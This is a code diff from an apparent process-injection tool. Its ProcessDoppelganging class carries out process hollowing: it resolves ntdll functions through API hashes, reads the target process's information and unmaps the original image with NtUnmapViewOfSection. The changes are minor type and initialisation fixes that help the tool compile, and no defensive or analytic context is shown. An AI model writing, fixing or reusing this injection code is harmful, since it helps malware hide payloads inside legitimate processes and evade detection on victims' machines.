@@ -316,14 +316,14 @@ bool ProcessDoppelganging::HollowProcess(HANDLE hProcess, const std::vector<uint
     std::cout << "[DEBUG] Performing process hollowing" << std::endl;
     
     // Get process information
-    PROCESS_BASIC_INFORMATION pbi;
+    PROCESS_BASIC_INFORMATION pbi = {0};
     auto NtQueryInformationProcess = g_APIResolver.GetNtdllFunction(APIHashes::NT_QUERY_INFORMATION_PROCESS);
     if (!NtQueryInformationProcess) {
         std::cerr << "[ERROR] Failed to get NtQueryInformationProcess" << std::endl;
         return false;
     }
     
-    typedef NTSTATUS (WINAPI* pNtQueryInformationProcess)(
+    typedef LONG (WINAPI* pNtQueryInformationProcess)(
         HANDLE ProcessHandle,
         PROCESSINFOCLASS ProcessInformationClass,
         PVOID ProcessInformation,
@@ -333,7 +333,7 @@ bool ProcessDoppelganging::HollowProcess(HANDLE hProcess, const std::vector<uint
     
     pNtQueryInformationProcess NtQueryInfo = reinterpret_cast<pNtQueryInformationProcess>(NtQueryInformationProcess);
     
-    NTSTATUS status = NtQueryInfo(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
+    LONG status = NtQueryInfo(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
     if (status != 0) {
         std::cerr << "[ERROR] NtQueryInformationProcess failed: " << status << std::endl;
         return false;
@@ -385,10 +385,10 @@ bool ProcessDoppelganging::UnmapOriginalImage(HANDLE hProcess, void* imageBase) 
         return false;
     }
     
-    typedef NTSTATUS (WINAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
+    typedef LONG (WINAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
     pNtUnmapViewOfSection NtUnmap = reinterpret_cast<pNtUnmapViewOfSection>(NtUnmapViewOfSection);
     
-    NTSTATUS status = NtUnmap(hProcess, imageBase);
+    LONG status = NtUnmap(hProcess, imageBase);
     return (status == 0);
 }
 
